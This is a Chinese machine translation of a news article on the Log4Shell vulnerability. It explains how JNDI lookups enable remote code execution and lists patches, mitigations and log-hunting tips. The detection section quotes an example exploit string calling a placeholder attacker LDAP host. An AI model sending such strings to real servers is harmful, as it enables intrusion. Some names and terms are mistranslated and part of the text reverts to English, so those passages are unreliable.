# Log4Shell:我们有大麻烦了

> 原文：<https://thenewstack.io/log4shell-we-are-in-so-much-trouble/>

![](img/12cbbc27cd63ad10234d03a126c40506.png)开源 Java 日志库 [Apache Log4j](https://logging.apache.org/log4j/) 用的很多。当我说很多时，我的意思是它在数百个应用中使用。而且，这些不只是任何旧程序，它们包括<深呼吸>阿帕奇项目，如德鲁伊、杜博、弗林克、Flume、Hadoop、卡夫卡、Solr、Spark 和 Struts 苹果 iCloud[众多思科计划](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-apache-log4j-qRuKNEbd)；弹性 LogStashGrayLog2《我的世界》客户端和服务器；Neo4J、Steam、Twitter，以及 Horizon、vCenter、vRealize 和 Tanzu 等 [VMware](https://tanzu.vmware.com?utm_content=inline-mention) 程序。就这样一直持续下去。

我肯定外面有更多受欢迎的图书馆。我只是一时想不出任何答案。

### 检查您的应用程序

要想知道你的应用程序中哪些是易受攻击的——而不是是否——请查看 SwitHak 的、 [Royce Williams 的](https://www.techsolvency.com/story-so-far/cve-2021-44228-log4j-log4shell/)和[荷兰国家网络安全中心(NCSC)的列表](https://github.com/NCSC-NL/log4shell/tree/main/software)。

零日漏洞，[CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)——也称为 log 4 shell——既容易被利用，又可以被用来完全控制易受攻击的服务器。可以通过这种零日攻击进行的攻击系列被称为 [Log4sholdShell](https://www.lunasec.io/docs/blog/log4j-zero-day/) 。

### 越糟越好

那么 Log4Shell 到底有多差呢？越糟越好。根据[国家漏洞数据库(NVD)](https://nvd.nist.gov/) ，它被评为 [10.0 CVSSv3](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) ，按照我 0.1 到 10 的评分标准，这是最差的。如果被成功利用，攻击者可以通过远程代码执行(RCE)攻击来攻击您的服务器。考虑到它是如此容易被利用，甚至当你正在读这篇文章的时候，你很有可能已经被攻击了。

作为安全公司 [Nextron Systems 的](https://www.nextron-systems.com/)研究负责人， [Florian Roth](https://www.linkedin.com/in/floroth/) 在推特上写道，“ [#](https://twitter.com/hashtag/Log4Shell?src=hashtag_click) [Log4Shell](https://twitter.com/hashtag/Log4Shell?src=hashtag_click) 漏洞不仅仅是 RCE 0day。这是一个在各种软件产品中造成成百上千天的漏洞。这是一枚 0day 集束炸弹。”

### 使用补丁！

是啊，这会很有趣的。

在 2.0 和 2.14.1 版本之间使用 Apache Log4j 的任何系统或服务都容易受到攻击。现在有一个固定版本出来了: [Apache Log4j 2.15.0](https://logging.apache.org/log4j/2.x/download.html) 。你应该尽快更新这个*(编者注:这个更新结果是不完整的，[查看这个帖子](https://thenewstack.io/another-day-another-log4j-vulnerability/)了解更新的细节)*。

你还在等什么？说真的，现在就修补！

回来了？打补丁？很好。

那是什么？你不能因为你的程序至关重要就让它停机？如果它关闭了你的服务器或者一个[攻击者用它来开始玩毁灭](https://twitter.com/gegy1000/status/1469714451716882434)而不是运行你的服务，那将会变得更加严重。幸运的是，[亚马逊网络服务](https://aws.amazon.com/?utm_content=inline-mention) (AWS)开发者已经创建了一个修补程序， [Log4jHotPatch](https://github.com/corretto/hotpatch-for-apache-log4j2) ，它可以在[亚马逊 Corretto 8](https://docs.aws.amazon.com/corretto/latest/corretto-8-ug/what-is-corretto-8.html) 上工作，这是它的 OpenJDK 8 实现。有了代码，把它移植到其他平台应该不会太难。

### 发现问题

但是你还没有完成。您可以看到 Log4j 在如此多的程序中被使用和调用，即使您在系统中修补了它，它也很可能隐藏在其他应用程序中。只需要一个漏洞，一个易受攻击的程序，你的服务器就会瘫痪。

正如安全副总裁 Josh Bressers 、 [Anchore](http://www.anchore.com/) 解释的那样，“log4j 漏洞带来的挑战之一实际上是找到它。Java 应用程序和依赖项通常采用某种打包格式，这使得分发和运行变得非常容易，但却很难弄清楚这些软件包的内容。”

你看，Bressers 继续说，“当在 Java 中工作时，依赖关系被编目为 Java 档案文件，通常称为 JAR 文件。这些包可以作为 Java 库使用，但是这里的问题是 JAR 文件可能开始看起来像俄罗斯的嵌套玩偶。一个 JAR 文件可以包含 JAR 文件，而这些 JAR 文件也包含 JAR 文件。它基本上是一路向下的 JAR 文件。”

“尽管如此，所有的希望并没有失去！”结束了布雷泽斯。您可以使用两个 Anchore 开源项目 [Syft](https://github.com/anchore/syft) 和 [Grype](https://github.com/anchore/grype) ，来检测和识别 log4j，即使它被埋在第三圈 JAR 文件中。

### 它是如何工作的

也就是说，Log4Shell 是这样工作的。

Apache log4j 库使得开发人员可以非常容易地记录应用程序中的各种数据。用户还可以提交数据，这些数据将被记录。log4j 不做的是整理数据。

如果输入包含特殊字符，那么将会调用 Java 方法 lookup。这支持几种查找，比如 [Java 命名和目录接口(JNDI)](https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/index.html) 查找、JVM 输入参数查找(JMX)和 Web 查找。JNDI 查找允许检索变量，并支持远程查找，如轻量级目录访问协议(LDAP)和 Java 远程方法调用(RMI)。一旦被调用，这些就会在本地 log4j 服务器中执行用户定义的远程 Java 类，然后糟糕的事情就会发生。例如受害者服务器上的 RCE。

### 好消息是:修复工作已经开始

好消息是，这个零日一旦被发现，很快就被修复了。耶阿帕奇！坏消息是，在大多数人知道这个安全漏洞之前，它就已经被攻击了。

Cloudflare 首席执行官 [Matthew Prince](https://www.linkedin.com/in/mprince/) 在推特上写道，“[我们迄今为止发现的#Log4J 漏洞利用](https://twitter.com/eastdakota/status/1469800951351427073)的最早证据是 2021-12-01 04:36:50 UTC。这表明它在公开披露前至少在野外存在了 9 天。然而，在公开披露之前，不要看到大规模剥削的证据。”

思科 Talos 补充道，其安全研究人员已经发现了“12 月 2 日发现的名为 CVE-2021-44228 的漏洞”因此，塔罗斯建议，你应该寻找“妥协的迹象应该扩展他们的搜索，至少要追溯到那个时候。”

### 你应该做什么

好主意。这是你现在应该做的。

首先，让我重复我自己，修补它了。

美国[网络安全和基础设施安全局(CISA)](https://www.cisa.gov/) 局长 [Jen Easterly](https://www.linkedin.com/in/jen-easterly-225380123/) 也强烈建议你:

1.  列举所有安装了 log4j 的面向外部的设备。
2.  确保您的安全运营中心正在对属于上述类别的设备上的每一个警报采取行动。
3.  安装带有自动更新规则的 web 应用程序防火墙(WAF ),以便您的安全运营中心能够集中处理较少的警报。

祝你最后一次好运。在接下来的几周里，IT 部门的每个人都会像洪水中的海狸一样忙碌。Log4j 漏洞已经被用于 Muhstik 和 Mirai 未来组合僵尸网络来攻击易受攻击的服务器。

### 采取严厉措施

如果你想采取更激烈的方法，你可以采取[帕洛阿尔托网络](https://www.paloaltonetworks.com/cloud-security?utm_content=inline-mention)‘Unit 42 反 Log4Shell 防御策略:

*   在带有防火墙的服务器上禁用可疑的出站流量，如 LDAP 和 RMI。
*   禁用 JNDI 查找。
    *   设置 log4j2.formatMsgNoLookups=true
    *   删除 log4j-core 中的 JndiLookup 文件，并重新启动服务。
*   禁用 JNDI
    *   设置 spring.jndi.ignore=true

当然，这些方法的问题是您可能会在这个过程中破坏您的应用程序。有时候治疗可能比疾病更糟糕。

如果出于某种原因，您被绑定到特定版本的 Log4j， [Red Hat](https://www.openshift.com/try?utm_content=inline-mention) 有一些安全建议。这些是:

–在> =2.10 的版本中，将系统属性 log4j2.formatMsgNoLookups 或环境变量 LOG4J_FORMAT_MSG_NO_LOOKUPS 设置为 true。

–对于版本> =2.7 和<=2.14.1, all PatternLayout patterns can be modified to specify the message converter as %m{nolookups} instead of just %m.

– For releases > =2.0-beta9 和<=2.10.0, remove the JndiLookup class from the classpath. For example:

```
zip  -q  -d  log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class

```

通过与你的供应商沟通，尽快安装并运行他们的补丁程序，你可以让你的生活变得更轻松。您还应该研究可以解决 Log4j 问题的安全公司产品。这些目前包括来自 [TideLift](https://blog.tidelift.com/tidelift-advisory-log4shell-critical-vulnerability-what-you-need-to-know-and-do) 、 [Sonatype](https://www.sonatype.com/products/vulnerability-scanner) 和 [NCCGroup](https://research.nccgroup.com/2021/12/12/log4shell-reconnaissance-and-post-exploitation-network-detection/) 的产品。

您还可以通过扫描自己的日志来寻找潜在的攻击。微软发现攻击可能包含如下字符串:

```
${jndi:ldap://[attacker site]/a}

```

这里的[攻击者正在对目标系统执行 HTTP reques](https://www.microsoft.com/security/blog/2021/12/11/guidance-for-preventing-detecting-and-hunting-for-cve-2021-44228-log4j-2-exploitation/) t，该系统使用 Log4j 2 生成一个日志，该日志利用 JNDI 对攻击者控制的站点执行请求。然后，该漏洞会导致被利用的进程到达站点并执行有效负载。在许多观察到的攻击中，攻击者拥有的参数是一个 DNS 日志记录系统，用于记录对站点的请求，以获取易受攻击系统的指纹。"

这些字符串可以通过几个组件来识别。它们通常包含“jndi”，指的是 Java 命名和目录接口。接下来，它带有一个协议名，如“ldap”、“ldaps”、“rmi”、“dns”、“iiop”或“http”，位于攻击者域之前。你应该设置你晶片来阻止这些串。

### 一代人以来最严重的安全问题

[Steve Povolny](https://www.linkedin.com/in/steve-povolny-595a776/) ， [McAfee Enterprise 和 FireEye](https://www.fireeye.com/company/press-releases/2021/combination-of-mcafee-enterprise-and-fireeye-complete.html) 的高级威胁研究负责人说 [Log4Shell“现在完全属于与 Shellshock](https://www.zdnet.com/article/log4j-update-experts-say-log4shell-exploits-will-persist-for-months-if-not-years/) 、Heartbleed 和 EternalBlue 相同的对话。”

我认为他错了。我觉得这样更糟糕。Log4Shell 可能是一代人中最糟糕的安全问题。正如 Bressers 在一篇博客文章中提到的，“将会有很多假阴性报告，其中一个[产品声称它不使用 log4j，但它确实使用了](https://opensourcesecurity.io/2021/12/12/log4j-is-hard-to-find-and-harder-to-fix/)，只有 log4j 被隐藏在依赖地雷的深处。…将会有几周或几个月看不到更新的产品。”

坚持住，伙计们。这将是一段漫长而艰难的旅程。

<svg xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 68 31" version="1.1"><title>Group</title> <desc>Created with Sketch.</desc></svg>